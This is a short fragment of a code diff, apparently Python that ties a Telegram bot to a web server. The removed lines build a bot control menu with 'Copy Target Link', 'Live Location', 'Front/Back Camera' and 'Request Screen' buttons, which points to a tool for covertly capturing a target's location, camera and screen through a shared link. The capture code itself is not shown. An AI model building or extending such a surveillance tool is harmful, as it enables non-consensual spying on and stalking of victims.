-        [{"text": "🔗 Copy Target Link", "callback_data": "link"}, {"text": "📍 Live Location", "callback_data": "map"}],
-        [{"text": "📷 Front Camera", "callback_data": "front"}, {"text": "📷 Back Camera", "callback_data": "back"}],
-        [{"text": "💻 Request Screen", "callback_data": "screen"}],
-        [{"text": "🛑 Shutdown System", "callback_data": "stop"}]
-    ]}
-    try: requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": text, "reply_markup": k})
-    except: pass
-
-def answer(query, text):
-    try: requests.post(f"{BOT_API}/answerCallbackQuery", json={"callback_query_id": query['id'], "text": text})
-    except: pass
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    print(f"System Running on Port {port}")
     threading.Thread(target=bot_manager, daemon=True).start()
     socketio.run(app, host='0.0.0.0', port=port)
